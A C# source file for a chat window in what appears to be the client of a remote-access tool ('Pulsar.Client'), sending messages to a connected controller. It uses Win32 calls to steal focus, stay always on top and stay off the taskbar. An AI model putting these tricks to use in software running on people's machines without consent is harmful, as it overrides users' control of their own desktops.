using Pulsar.Client.Utilities.DarkMode;
using Pulsar.Common.Messages.UserSupport.RemoteChat;
using Pulsar.Common.Networking;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Pulsar.Client
{
    public partial class FrmRemoteChat : Form
    {
        [DllImport("user32.dll")]
        public static extern uint GetWindowThreadProcessId(IntPtr hWnd, IntPtr lpdwProcessId);

        [DllImport("user32.dll")]
        static extern bool SetForegroundWindow(IntPtr hWnd);
        [DllImport("user32.dll")]
        public static extern bool BringWindowToTop(IntPtr hWnd);

        [DllImport("user32.dll")]
        public static extern bool AttachThreadInput(uint idAttach, uint idAttachTo, bool fAttach);

        [DllImport("Kernel32.dll")]
        public static extern uint GetCurrentThreadId();
        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        private ISender _connectedClient;
        public bool Active;

        private static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
        private const uint SWP_NOMOVE = 0x0002;
        private const uint SWP_NOSIZE = 0x0001;
        private const uint SWP_SHOWWINDOW = 0x0040;

        public FrmRemoteChat(ISender client)
        {

            this._connectedClient = client;
            InitializeComponent();
            DarkModeManager.ApplyDarkMode(this);
            Active = true;
            txtMessage.KeyDown += new KeyEventHandler(txtMessage_KeyDown); // Subscribe to the KeyDown event

        }
        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ExStyle |= 0x80;
                return cp;
            }
        }


        public void AddMessage(string sender, string message)
        {
            txtMessages.AppendText(string.Format("{0} {1}: {2}{3}", DateTime.Now.ToString("HH:mm:ss"), sender, message, Environment.NewLine));
            ForceFocus();

        }

        private void FrmRemoteChat_FormClosing(object sender, FormClosingEventArgs e)
        {
            // Allow the form to close
        }
        public void ForceFocus()
        {
            var fThread = GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero);
            var cThread = GetCurrentThreadId();
            if (fThread != cThread)
            {
                AttachThreadInput(fThread, cThread, true);
                BringWindowToTop(Handle);
                AttachThreadInput(fThread, cThread, false);
            }
            else BringWindowToTop(Handle);
            txtMessage.Focus();
        }
        private void FrmRemoteChat_Shown(object sender, EventArgs e)
        {
            txtMessage.Focus();
        }

        public string sendlol()
        {
            return txtMessage.Text.Trim();
        }
        public void SendMessageServer(ISender connectedClient, string message)
        {
            connectedClient.Send(new GetChat { Message = message });
        }


        private void txtMessage_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                e.SuppressKeyPress = true; // Prevents the ding sound on pressing enter
                Sendpacket_Click(this, new EventArgs()); // Call the Send method
            }
        }

        private void Sendpacket_Click(object sender, EventArgs e)
        {
            try
            {
                if (txtMessage.Text.Trim() != "")
                {
                    SendMessageServer(_connectedClient, txtMessage.Text.Trim());
                    AddMessage("Me", txtMessage.Text.Trim());
                    txtMessage.Text = "";
                    txtMessage.Focus();
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }
        }

        private void FrmRemoteChat_FormClosed(object sender, FormClosedEventArgs e)
        {
            try
            {
                AddMessage("System", "Chat has been ended.");
                SendMessageServer(_connectedClient, "Chat has been ended.");
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }
        }

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
        protected override void OnShown(EventArgs e)
        {
            base.OnShown(e);
            SetWindowPos(this.Handle, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
        }
        protected override void WndProc(ref Message m)
        {
            base.WndProc(ref m);
            const int WM_ACTIVATE = 0x0006;
            const int WM_SHOWWINDOW = 0x0018;
            if (m.Msg == WM_ACTIVATE || m.Msg == WM_SHOWWINDOW)
            {
                SetWindowPos(this.Handle, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
            }
        }
    }
}
